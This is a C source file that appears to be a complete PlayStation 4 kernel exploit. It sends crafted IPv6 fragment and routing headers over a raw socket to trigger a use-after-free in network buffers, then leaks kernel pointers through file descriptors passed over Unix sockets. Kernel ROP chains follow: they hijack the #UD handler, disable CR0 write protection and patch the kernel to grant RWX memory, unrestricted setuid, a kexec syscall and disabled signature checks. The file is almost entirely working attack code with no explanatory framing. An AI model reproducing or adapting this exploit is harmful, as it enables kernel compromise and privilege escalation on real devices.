#define FD_SETSIZE 2048
#define sysctl __sysctl
#include <sys/types.h>
#include <sys/param.h>
#include <sys/cpuset.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <sys/vmmeter.h>
#include <sys/filio.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <vm/vm_param.h>
#include <errno.h>
#include <printf/printf.h>
#include <ps4/errno.h>
#include <ps4/saveall.h>

unsigned long long __builtin_gadget_addr(const char*);

void send_fragment(int fd, char* src, size_t off, size_t sz, int is_final, uint32_t ident, int proto)
{
    unsigned char buf[0x2000];
    // hop-by-hop header
    buf[0] = 44;
    buf[1] = 0;
    buf[2] = 1;
    buf[3] = 4;
    buf[4] = buf[5] = buf[6] = buf[7] = 0x41;
    // fragment header
    buf[8] = proto;
    buf[9] = 0;
    size_t mid = off + !is_final;
    buf[10] = mid / 256;
    buf[11] = mid % 256;
    buf[12] = ident >> 24;
    buf[13] = ident >> 16;
    buf[14] = ident >> 8;
    buf[15] = ident;
    for(size_t i = 0; i < sz; i++)
        buf[16+i] = src[off+i];
    struct sockaddr_in6 sin6 = {
        .sin6_family = AF_INET6,
        .sin6_addr = {0},
        .sin6_port = 0xbeef,
    };
    sin6.sin6_addr.s6_addr[15] = 1;
    sendto(fd, buf, 16+sz, 0, (struct sockaddr*)&sin6, sizeof(sin6));
}

void build_rthdr(char* buf, int sz)
{
    buf[0] = 43;
    buf[1] = sz / 8 - 1;
    buf[2] = 0;
    buf[3] = 0;
    for(size_t i = 4; i < sz; i++)
        buf[i] = 0;
}

void send_shifted_fragment(int fd, char* src, size_t off, size_t sz, int is_final, uint32_t ident, int proto)
{
    unsigned char buf[0x2000];
    // hop-by-hop header
    buf[0] = 43;
    buf[1] = 0;
    buf[2] = 1;
    buf[3] = 4;
    buf[4] = buf[5] = buf[6] = buf[7] = 0x41;
    // padding
    build_rthdr(buf+8, 224);
    buf[8] = 44;
    // fragment header
    buf[232] = proto;
    buf[233] = 0;
    size_t mid = off + !is_final;
    buf[234] = mid / 256;
    buf[235] = mid % 256;
    buf[236] = ident >> 24;
    buf[237] = ident >> 16;
    buf[238] = ident >> 8;
    buf[239] = ident;
    for(size_t i = 0; i < sz; i++)
        buf[240+i] = src[off+i];
    struct sockaddr_in6 sin6 = {
        .sin6_family = AF_INET6,
        .sin6_addr = {0},
        .sin6_port = 0xbeef,
    };
    sin6.sin6_addr.s6_addr[15] = 1;
    sendto(fd, buf, 240+sz, 0, (struct sockaddr*)&sin6, sizeof(sin6));
}

#define RTHDR_1_SZ 0x50
#define RTHDR_2_SZ 32 // >8 to prevent double-free on second mbuf
#define FIRST_FRAGMENT_SZ 0x38
#define SPRAY_SIZE 256
#define NUM_UNIX 256
#define MAX_FDS 128

void push_mbuf(int* socks, int i)
{
    if(sendto(socks[i], &i, sizeof(i), 0, 0, 0) < 0)
        printf("push_mbuf failed\n");
}

void push_cluster(int* socks, int i)
{
    int arr[49];
    arr[0] = i;
    if(sendto(socks[i], arr, sizeof(arr), 0, 0, 0) < 0)
        printf("push_cluster failed\n");
}

void push_big_cluster(int* socks, int i)
{
    char arr[2048] = {0};
    if(sendto(socks[i], arr, sizeof(arr), 0, 0, 0) < 0)
        printf("push_cluster failed\n");
}

int pop_mbuf(int* socks, int i)
{
    int buf[37];
    buf[0] = i;
    recvfrom(socks[i], buf, sizeof(buf), MSG_DONTWAIT, 0, 0);
    return buf[0];
}

int peek_mbuf(int* socks, int i)
{
    int ans = 1000000;
    recvfrom(socks[i], &ans, sizeof(ans), MSG_DONTWAIT|MSG_PEEK, 0, 0);
    return ans;
}

int create_loopback(void)
{
#if 0
    int sock = socket(AF_INET6, SOCK_DGRAM, 0);
    struct sockaddr_in6 sin = {
        .sin6_family = AF_INET6,
        .sin6_addr = {0},
        .sin6_port = 0,
    };
    sin.sin6_addr.s6_addr[15] = 1;
#else
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_addr = {0x100007f},
        .sin_port = 0,
    };
#endif
    socklen_t sin_l = sizeof(sin);
    bind(sock, (struct sockaddr*)&sin, sin_l);
    getsockname(sock, (struct sockaddr*)&sin, &sin_l);
    connect(sock, (struct sockaddr*)&sin, sin_l);
    //fcntl(sock, F_SETFL, fcntl(sock, F_GETFL) | O_NONBLOCK);
    return sock;
}

int get_port(int fd)
{
    struct sockaddr_in6 sin;
    socklen_t l = sizeof(sin);
    getsockname(fd, (struct sockaddr*)&sin, &l);
    return sin.sin6_port;
}

int port_to_csum(int port)
{
    int base_port = 0x0de6;
    int base_csum = 0x36b1;
    int csum = base_csum - 2 * (port - base_port);
    csum += 0x1fffe;
    csum %= 0xffff;
    return csum;
}

void push_jumbo(int fd)
{
    char buf[2048];
    for(int i = 0; i < 2048; i++)
        buf[i] = 0x41;
    for(int i = 0; i < 31; i++)
        sendto(fd, buf, sizeof(buf), 0, 0, 0);
}

void* mmap_at(void* where, size_t sz)
{
    uintptr_t addr = (uintptr_t)where;
    uintptr_t end = addr + sz;
    addr &= ~4095ull;
    if((uintptr_t)mmap((void*)addr, end - addr, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) != addr)
    {
        printf("failed to mmap_at!\n");
        return 0;
    }
    //prefault pages
    unsigned char* p = where;
    for(size_t i = 0; i < sz; i++)
        p[i] = 0;
    return where;
}

ssize_t
write_fd(int fd, void *ptr, size_t nbytes, int* sendfd, int cnt)
{
    struct msghdr   msg;
    struct iovec    iov[1];

    union {
      struct cmsghdr    cm;
      char              control[CMSG_SPACE(MAX_FDS*sizeof(int))];
    } control_un;
    struct cmsghdr  *cmptr;

    msg.msg_control = control_un.control;
    msg.msg_controllen = CMSG_SPACE(cnt*sizeof(int));

    cmptr = CMSG_FIRSTHDR(&msg);
    cmptr->cmsg_len = CMSG_LEN(cnt*sizeof(int));
    cmptr->cmsg_level = SOL_SOCKET;
    cmptr->cmsg_type = SCM_RIGHTS;
    for(int i = 0; i < cnt; i++)
        ((int *) CMSG_DATA(cmptr))[i] = sendfd[i];

    msg.msg_name = NULL;
    msg.msg_namelen = 0;

    iov[0].iov_base = ptr;
    iov[0].iov_len = nbytes;
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    return(sendmsg(fd, &msg, 0));
}

ssize_t
read_fd(int fd, void *ptr, size_t nbytes, int *recvfd, int cnt)
{
    struct msghdr   msg;
    struct iovec    iov[1];
    ssize_t         n;
    int             newfd;

    union {
      struct cmsghdr    cm;
      char              control[CMSG_SPACE(MAX_FDS*sizeof(int))];
    } control_un;
    struct cmsghdr  *cmptr;

    msg.msg_control = control_un.control;
    msg.msg_controllen = CMSG_SPACE(cnt*sizeof(int));

    msg.msg_name = NULL;
    msg.msg_namelen = 0;

    iov[0].iov_base = ptr;
    iov[0].iov_len = nbytes;
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    if ( (n = recvmsg(fd, &msg, 0)) <= 0)
        return(n);

    if ( (cmptr = CMSG_FIRSTHDR(&msg)) != NULL &&
        cmptr->cmsg_len == CMSG_LEN(cnt*sizeof(int))) {
        for(int i = 0; i < cnt; i++)
            recvfd[i] = ((int *) CMSG_DATA(cmptr))[i];
    } else {
        if(cmptr)
            for(int i = 0; i < 64; i++)
                printf("%08x\n", ((int*)CMSG_DATA(cmptr))[i]);
        else
            printf("no cmptr\n");
        n = -1;       /* descriptor was not passed */
    }

    return(n);
}

int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds, int bads[3])
{
    printf("starting kex...\n");
    printf("fds:");
    for(int i = 0; i < nfds; i++)
        printf(" %d", fd_to_leak[i]);
    printf("\n");
    cpuset_t xxx;
    CPU_ZERO(&xxx);
    CPU_SET(6, &xxx);
    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(xxx), &xxx);
    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_HOPOPTS);
    int socks[SPRAY_SIZE];
    for(int i = 0; i < SPRAY_SIZE; i++)
        socks[i] = create_loopback();
    int un[2 * NUM_UNIX];
    for(int i = 0; i < NUM_UNIX; i++)
        socketpair(AF_UNIX, SOCK_STREAM, 0, un+2*i);
    char buf[RTHDR_1_SZ + RTHDR_2_SZ];
    char buf_final[4096];
    for(int i = 0; i < 4096; i++)
        buf_final[i] = 255;
    char buf_unix[4097];
    for(int i = 0; i < 4097; i++)
        buf_unix[i] = 0;
    build_rthdr(buf, RTHDR_1_SZ);
    build_rthdr(buf + RTHDR_1_SZ, RTHDR_2_SZ);
    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
    send_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xdead0002, 43);
    send_fragment(sock, buf, FIRST_FRAGMENT_SZ, sizeof(buf) - FIRST_FRAGMENT_SZ, 1, 0xdead0002, 43);
    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
    for(int i = 0; i < SPRAY_SIZE; i++)
    {
        push_cluster(socks, i);
        nanosleep((void*)"\0\0\0\0\0\0\0\0\x80\x96\x98\0\0\0\0\0", 0);
    }
    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
    int bad1 = -1, bad2 = -1;
    for(int i = 0; i < SPRAY_SIZE; i++)
    {
        int j = peek_mbuf(socks, i);
        if(i != j)
            printf("%d -> %d\n", bad1 = i, bad2 = j);
    }
    if(bad1 < 0)
    {
        printf("leak_fds: no collision\n");
        return 1;
    }
    for(int i = 0; i < NUM_UNIX; i++)
        push_big_cluster(un, 2*i);
    pop_mbuf(socks, bad1);
    for(int i = 0; i < NUM_UNIX; i++)
        push_cluster(un, 2*i);
    recvfrom(socks[bad2], buf_final, sizeof(buf_final), MSG_DONTWAIT|MSG_PEEK, 0, 0);
    int bad3 = 1+*(int*)buf_final;
    pop_mbuf(socks, bad2);
    sendto(un[(bad3 == 1) ? 1 : 0], "X", 1, 0, 0, 0);
    for(int i = 0; i < NUM_UNIX; i++)
        if(i != (bad3 - 1) / 2)
            write_fd(un[2*i], buf_unix, sizeof(buf_unix), fd_to_leak, nfds);
    for(int i = 0; i < NUM_UNIX; i++)
    {
        recvfrom(un[2*i+1], buf_final, sizeof(buf_final), MSG_DONTWAIT|MSG_PEEK, 0, 0);
        if(*(int*)(buf_final+2048) != 2*i)
        {
            if(bad3 != 2*i+1)
            {
                printf("leak_fds: wrong socket corrupted\n");
                return 1;
            }
            printf("fucked up %d\n", i);
            uintptr_t* leak = (uintptr_t*)(buf_final+2048);
            if(leak[0] != __builtin_gadget_addr("dq 0xffff00000000") + (nfds+2)*8 || (unsigned int)leak[1] != 1)
            {
                printf("leak_fds: unexpected leak content: 0x%llx 0x%llx\n", leak[0], leak[1]);
                return 1;
            }
            for(int i = 0; i < nfds; i++)
                out[i] = leak[i+2];
        }
    }
    for(int i = 0; i < 2*NUM_UNIX; i++)
        if(i != bad3)
            close(un[i]);
    for(int i = 0; i < SPRAY_SIZE; i++)
        if(i != bad1 && i != bad2)
            close(socks[i]);
    close(sock);
    bads[0] = socks[bad1];
    bads[1] = socks[bad2];
    bads[2] = un[bad3];
    return 0;
}

int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
{
    printf("starting kex...\n");
    cpuset_t xxx;
    CPU_ZERO(&xxx);
    CPU_SET(6, &xxx);
    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(xxx), &xxx);
    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_HOPOPTS);
    int socks[SPRAY_SIZE];
    for(int i = 0; i < SPRAY_SIZE; i++)
        socks[i] = create_loopback();
    int un[2*NUM_UNIX];
    for(int i = 0; i < NUM_UNIX; i++)
        socketpair(AF_UNIX, SOCK_STREAM, 0, un+2*i);
    char buf[RTHDR_1_SZ + RTHDR_2_SZ];
    char buf_final[4096];
    for(int i = 0; i < 4096; i++)
        buf_final[i] = 255;
    char buf_unix[4097];
    for(int i = 0; i < 4097; i++)
        buf_unix[i] = 0;
    build_rthdr(buf, RTHDR_1_SZ);
    build_rthdr(buf + RTHDR_1_SZ, RTHDR_2_SZ);
    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
    send_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xdead0002, 43);
    send_fragment(sock, buf, FIRST_FRAGMENT_SZ, sizeof(buf) - FIRST_FRAGMENT_SZ, 1, 0xdead0002, 43);
    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
    for(int i = 0; i < SPRAY_SIZE; i++)
    {
        push_cluster(socks, i);
        nanosleep((void*)"\0\0\0\0\0\0\0\0\x80\x96\x98\0\0\0\0\0", 0);
    }
    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
    int bad1 = -1, bad2 = -1;
    for(int i = 0; i < SPRAY_SIZE; i++)
    {
        int j = peek_mbuf(socks, i);
        if(i != j)
            printf("%d -> %d\n", bad1 = i, bad2 = j);
    }
    if(bad1 < 0)
    {
        printf("trigger: no collision\n");
        return 1;
    }
    //print_mbuf_addr(socks[bad1]);
    //print_mbuf_addr(socks[bad2]);
    pop_mbuf(socks, bad1);
    //hbh
    buf[0] = 6;
    buf[1] = 0;
    buf[2] = 1;
    buf[3] = 4;
    buf[4] = buf[5] = buf[6] = buf[7] = 0x41;
    for(int i = 0; i < NUM_UNIX; i++)
        send_shifted_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xfee10000+i, 60);
    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
    //print_mbuf_addr(socks[bad2]);
    recvfrom(socks[bad2], buf_final, sizeof(buf_final), MSG_DONTWAIT|MSG_PEEK, 0, 0);
    int uaf_idx = __builtin_bswap32(*(unsigned int*)(buf_final+276));
    if((uaf_idx & 0xffff0000) != 0xfee10000)
    {
        printf("uaf not exploited, wtf??\n");
        return 1;
    }
    uaf_idx &= 0xffff;
    //print_mbuf_addr(socks[bad2]);
    pop_mbuf(socks, bad2);
    int fd_to_pass[32];
    for(int i = 0; i < 32; i++)
        fd_to_pass[i] = trg_fd;
    char x = 'X';
    for(int i = 0; i < NUM_UNIX; i++)
        write_fd(un[2*i], buf_unix, sizeof(buf_unix), fd_to_pass, 32);
    for(int i = 0; i < NUM_UNIX; i++)
        if(i != uaf_idx)
            send_fragment(sock, buf_final, FIRST_FRAGMENT_SZ, 1, 1, 0xfee10000+i, 60);
    if(1)
    {
        int i = uaf_idx;
        int off = FIRST_FRAGMENT_SZ;
        while(off + sizeof(buf_final) < 65536)
        {
            send_fragment(sock, buf_final - off, off, sizeof(buf_final), 0, 0xfee10000+i, 60);
            off += sizeof(buf_final);
        }
        send_fragment(sock, buf_final - off, off, 3807, 1, 0xfee10000+i, 60);
    }
    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
    fd_set ss;
    FD_ZERO(&ss);
    struct timeval for_select = {0, 0};
    bad_fds[0] = socks[bad1];
    bad_fds[1] = socks[bad2];
    int bad_un = -1;
    for(int i = 0; i < NUM_UNIX; i++)
    {
        bad_fds[2] = un[2*i+1];
        if(read_fd(un[2*i+1], &x, 1, fd_to_pass, 32) < 0)
        {
            printf("read_fd failed, wtf??\n");
            continue;
        }
        for(int j = 0; j < 32; j++)
        {
            *sel_cur = fd_to_pass[j];
            if(fd_to_pass[j] < 2048) // wtf if not
            {
                FD_SET(fd_to_pass[j], &ss);
                select(fd_to_pass[j]+1, &ss, 0, 0, &for_select); //kpayload
                FD_CLR(fd_to_pass[j], &ss);
            }
            close(fd_to_pass[j]);
        }
    }
    //this code crashes. but if we don't close them explicitly the process will terminate just fine
#if 0
    for(int i = 0; i < 2*NUM_UNIX; i++)
        close(un[i]);
    for(int i = 0; i < SPRAY_SIZE; i++)
        if(i != bad1 && i != bad2)
            close(socks[i]);
    close(sock);
#endif
    return 0;
}

/*
45, 36, 37, 47
100
38
*/
#if 0
void* kernel_payload(void* o, int****** td, unsigned long long kernel_base, uintptr_t decref_fp, int* kp_bad_fds)
{
    int*** fd = td[1][9][0];
    for(int i = 0; i < 6; i++)
    {
        int* sock = fd[kp_bad_fds[i]][0];
        for(int base = 74; base <= 136; base += 62) // socket->so_{rcv,snd}
        {
            sock[base+9] = 0; // sb_cc
            sock[base+11] = 0; // sb_mbcnf
            sock[base] = 0; // sb_mb low
            sock[base+1] = 0; // sb_mb high
        }
        //fd[kp_bad_fds[i]] = 0;
    }
    fd[kp_bad_fds[6]] = (void*)decref_fp; //0;
    void** zone_pack = *(void**)(kernel_base + 0x1b45a28);
    for(int i = 0; i < 8; i++)
        zone_pack[32+16*i] = zone_pack[33+16*i] = 0; //detach buckets
    return 0x12345678;
}
#endif

int randomized_path(unsigned long long, char*, size_t*);

int my_dup(int fd)
{
    int un[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, un);
    char x = 'X';
    write_fd(un[1], &x, 1, &fd, 1);
    read_fd(un[0], &x, 1, &fd, 1);
    close(un[0]);
    close(un[1]);
    return fd;
}

void sidt(unsigned short* size, unsigned long long* base)
{
    unsigned char data[10];
    unsigned long long ropchain[12] = {
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rsi"),
        ropchain+11,
        __builtin_gadget_addr("mov [rsi], rax ; mov al, 1"),
	__builtin_gadget_addr("pop rax"),
        data + 0x77,
        __builtin_gadget_addr("sidt [rax - 0x77]"),
        __builtin_gadget_addr("pop rsi"),
        -8ull,
        __builtin_gadget_addr("sub rdi, rsi ; mov rdx, rdi"),
        __builtin_gadget_addr("pop rsp"),
        0
    };
    ((void(*)(void))ropchain)();
    *size = *(unsigned short*)data;
    *base = *(unsigned long long*)(data + 2);
}

void print_sidt(void)
{
    unsigned short len;
    unsigned long long base;
    sidt(&len, &base);
    printf("%hd 0x%llx\n", len, base);
}

#define KERNEL_READ_CR0 0x3d9420
#define KERNEL_WRITE_CR0 0x3d942d

/*
3d9420:
push rbp
mov rbp, rsp
mov rax, cr0
or rax, 0x5002a
3d942d:
mov cr0, rax
test rax, 0x10000
jne .+2
ud2
pop rbp
ret
*/

extern char kernel_fixup[];
extern unsigned long long kp_kernel_base;
extern unsigned long long kernel_fixup_ret;
extern unsigned long long kp_decref_fp;

int main()
{
    if(!setuid(0)) //already exploited
        return 179;
    int kp_bad_fds[7];
    int fd[256];
    char path[] = "/0123456789/common/lib/libkernel.sprx";
    char buf[16];
    size_t sz = sizeof(buf);
    randomized_path(0, buf, &sz);
    for(int i = 0; i < 10; i++)
        path[i+1] = buf[i];
    for(int i = 0; i < 256; i++)
        fd[255-i] = open(path, O_RDONLY);
    for(int i = 80; i < 256; i++)
        close(fd[i]);
    uintptr_t leak[80];
    if(leak_fds(fd, leak, 80, kp_bad_fds))
    {
        printf("leak_fds failed\n");
        return 1;
    }
    for(int i = 0; i < 80; i++)
        printf("%d %d %p\n", i, fd[i], (void*)leak[i]);
    int low = -1, high = -1;
    for(int i = 0; i < 80 && low < 0; i++)
        if((leak[i] & 255) == 0x20)
            for(int j = 0; j < 80 && low < 0; j++)
                if(leak[j] != leak[i] && (leak[j] & ~255ull) == (leak[i] & ~255ull))
                {
                    low = i;
                    high = j;
                }
    for(int i = 0; i < 80; i++)
        if(i != low && i != high)
            close(fd[i]);
    if(low < 0)
    {
        printf("no good socket pair found, aborting\n");
        return 1;
    }
    printf("%d %d\n", low, high);
    printf("%llx\n", (long long)lseek(fd[low], __builtin_gadget_addr("dq 0x2eadbeefdeadbeef"), SEEK_SET));
    printf("%d\n", errno);
    int dups[8];
    for(int i = 0; i < 8; i++)
        printf("%d\n", dups[i] = my_dup(fd[low]));
    /* krop stuff */
    unsigned short idt_size;
    unsigned long long idt_base;
    sidt(&idt_size, &idt_base);
    printf("0x%hx 0x%llx\n", idt_size, idt_base);
    unsigned long long kernel_base = idt_base - 0x220c390;
    unsigned long long kexec_base = kernel_base + 0x1122340 + 11 * 48;
    unsigned long long ud_base = idt_base + 6 * 16;
    unsigned long long ud_1_bak;
    unsigned long long ud_2_bak;
    unsigned long long ud_dump[2];
    unsigned long long ud_handler = __builtin_gadget_addr("$pivot_addr");
    unsigned int magic = 0xdeadbeef;
    void** dead = (void*)(1+(uintptr_t)mmap((void*)__builtin_gadget_addr("dq 0x900000000"), 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0));
    printf("%p %d\n", dead, errno);
    save_area_t* sa = mmap(0, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    (*sa)[0] = 1; //prefault
    unsigned long long pivot2;
    unsigned long long krop1[] = {
        /* __builtin_gadget_addr("pop rdi"), */
        ud_base,
        __builtin_gadget_addr("cli"),
        //back up #UD handler
        __builtin_gadget_addr("mov ax, [rdi]"),
        __builtin_gadget_addr("pop rcx"),
        &ud_1_bak,
        __builtin_gadget_addr("mov [rcx], rax"),
        __builtin_gadget_addr("pop rdi"),
        ud_base + 6,
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rcx"),
        &ud_2_bak,
        __builtin_gadget_addr("mov [rcx], rax"),
        //idt is writable, overwrite #UD handler with stack pivot
        __builtin_gadget_addr("pop rax"),
        ud_handler >> 16,
        __builtin_gadget_addr("mov [rdi], rax"),
        __builtin_gadget_addr("pop rdi"),
        ud_base,
        __builtin_gadget_addr("pop rax"),
        ud_handler,
        __builtin_gadget_addr("mov [rdi], ax"),
        //report exploit success
        __builtin_gadget_addr("pop rdi"),
        &magic,
        __builtin_gadget_addr("pop rax"),
        0xfee1dead,
        __builtin_gadget_addr("mov [rdi], eax"),
        //reset cr0.WP
        kernel_base + KERNEL_READ_CR0,
	__builtin_gadget_addr("pop rcx"),
        __builtin_gadget_addr("dq 0xfffffffffffeffff"),
        __builtin_gadget_addr("and rax, rcx"),
        //prepare #UD stack pivot
        __builtin_gadget_addr("pop rdi"),
        ud_dump,
        __builtin_gadget_addr("mov [rdi], rax"),
        __builtin_gadget_addr("pop rdi"),
        (&pivot2) - 7,
        kernel_base + KERNEL_WRITE_CR0, //warps to krop2
    };
    unsigned long long krop2[] = {
        //restore #UD handler
        /* __builtin_gadget_addr("pop rdi"), */
        ud_base,
        __builtin_gadget_addr("pop rcx"),
        &ud_1_bak,
        __builtin_gadget_addr("mov rax, [rcx]"),
        __builtin_gadget_addr("mov [rdi], ax"),
        __builtin_gadget_addr("pop rdi"),
        ud_base+6,
        __builtin_gadget_addr("pop rcx"),
        &ud_2_bak,
        __builtin_gadget_addr("mov rax, [rcx]"),
        __builtin_gadget_addr("mov [rdi], rax"),
        __builtin_gadget_addr("pop rdi"),
        kernel_base,
        __builtin_gadget_addr("pop rax"),
        __builtin_gadget_addr("dq 0xc3008b4865c03148"), //xor rax, rax ; mov rax, gs:[rax] ; ret
        __builtin_gadget_addr("mov [rdi], rax"),
        kernel_base, //the above gadget
        __builtin_gadget_addr("pop rcx"),
        8,
        __builtin_gadget_addr("add rax, rcx"),
        __builtin_gadget_addr("mov rax, [rax]"),
        __builtin_gadget_addr("pop rcx"),
        0x48,
        __builtin_gadget_addr("add rax, rcx"),
        __builtin_gadget_addr("mov rax, [rax]"),
        __builtin_gadget_addr("mov rax, [rax]"),
        __builtin_gadget_addr("pop rdi"),
        krop2+32,
        __builtin_gadget_addr("mov [rdi], rax"),
        //call C payload
        __builtin_gadget_addr("pop rdi"),
        kp_bad_fds,
        __builtin_gadget_addr("pop r8"),
        0, //krop2+32
        __builtin_gadget_addr("pop rsp"),
        kernel_fixup,
        //store return value
        __builtin_gadget_addr("pop rdi"),
        ud_dump+1,
        __builtin_gadget_addr("mov [rdi], rax"),
        //restore elf header
        __builtin_gadget_addr("pop rdi"),
        kernel_base,
        __builtin_gadget_addr("pop rax"),
        __builtin_gadget_addr("dq 0x09010102464c457f"),
        __builtin_gadget_addr("mov [rdi], rax"),
        //patches:
        //syscall everywhere
        __builtin_gadget_addr("pop rdi"),
        kernel_base + 0x490,
        __builtin_gadget_addr("xor eax, eax"),
        __builtin_gadget_addr("mov [rdi], eax"),
        __builtin_gadget_addr("pop rdi"),
        kernel_base + 0x4b2,
        __builtin_gadget_addr("pop rax"),
        0x19ce9,
        __builtin_gadget_addr("mov [rdi], rax"),
        //mmap rwx
        __builtin_gadget_addr("pop rax"),
        0x37,
        __builtin_gadget_addr("pop rdi"),
        kernel_base + 0xdb17d,
        __builtin_gadget_addr("mov [rdi], al"),
        __builtin_gadget_addr("pop rdi"),
        kernel_base + 0xdb180,
        __builtin_gadget_addr("mov [rdi], al"),
        //mprotect rwx
        __builtin_gadget_addr("pop rdi"),
        kernel_base + 0x3014c8,
        __builtin_gadget_addr("pop rax"),
        0x04eb,
        __builtin_gadget_addr("mov [rdi], ax"),
        //setuid
        __builtin_gadget_addr("pop rdi"),
        kernel_base + 0x37a320,
        __builtin_gadget_addr("pop rax"),
        0xb8,
        __builtin_gadget_addr("mov [rdi], al"),
        __builtin_gadget_addr("pop rdi"),
        kernel_base + 0x37a321,
        __builtin_gadget_addr("xor eax, eax"),
        __builtin_gadget_addr("mov [rdi], eax"),
        //kexec (syscall #11)
        __builtin_gadget_addr("pop rdi"),
        kexec_base,
        __builtin_gadget_addr("pop rax"),
        2,
        __builtin_gadget_addr("mov [rdi], rax"),
        __builtin_gadget_addr("pop rdi"),
        kexec_base + 8,
        __builtin_gadget_addr("pop rax"),
        kernel_base + 0x2e3692,
        __builtin_gadget_addr("mov [rdi], rax"),
        __builtin_gadget_addr("pop rdi"),
        kexec_base + 40,
        __builtin_gadget_addr("pop rax"),
        __builtin_gadget_addr("dq 0x100000000"),
        __builtin_gadget_addr("mov [rdi], rax"),
        //veri shit
        __builtin_gadget_addr("pop rdi"),
        kernel_base + 0x637394,
        __builtin_gadget_addr("pop rax"),
        0x9090,
        __builtin_gadget_addr("mov [rdi], ax"),
        //dynlib fixes by alazif & chendochap
        __builtin_gadget_addr("pop rax"),
        0xe990,
        __builtin_gadget_addr("pop rdi"),
        kernel_base + 0x4523c4,
        __builtin_gadget_addr("mov [rdi], ax"),
        __builtin_gadget_addr("pop rdi"),
        kernel_base + 0x451e04,
        __builtin_gadget_addr("mov [rdi], ax"),
        __builtin_gadget_addr("pop rdi"),
        kernel_base + 0x29a30,
        __builtin_gadget_addr("pop rax"),
        0xc3c03148,
        __builtin_gadget_addr("mov [rdi], eax"),
        //reset wp & return to userspace
        kernel_base + KERNEL_READ_CR0,
        __builtin_gadget_addr("sti"),
        __builtin_gadget_addr("leave"),
    };
    pivot2 = krop2;
    kp_kernel_base = kernel_base;
    kp_decref_fp = leak[high];
    kernel_fixup_ret = krop2+35;
    unsigned long long rax[14] = {0, 0, __builtin_gadget_addr("$pivot_addr") /* mov rsp, [rdi + 0x38] ; pop rdi ; ret */, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, __builtin_gadget_addr("$webkit_base + 0xd3890") /* push rbp ; mov rbp, rsp ; mov rax, [rdi] ; call [rax + 0x10] */};
    unsigned long long rdi[8] = {rax, 0, 0, 0, 0, 0, 0, krop1};
    dead[1] = rdi;
    dead[4] = __builtin_gadget_addr("$webkit_base + 0x1480be2"); //mov rdi, [rax + 8] ; mov rax, [rdi] ; jmp [rax + 0x68]
    /* end krop stuff */
    if(trigger(fd[high], leak[low] + 0x1b, kp_bad_fds+3, kp_bad_fds+6))
    {
        printf("trigger failed\n");
        return 1;
    }
    if(magic == 0xdeadbeef)
    {
        printf("exploit reports success but krop did not run, wtf??\n");
        return 1;
    }
    printf("exploit done: 0x%x 0x%llx 0x%llx\n", magic, ud_dump[0], ud_dump[1]);
    printf("%d\n", setuid(0));
    return 0;
}
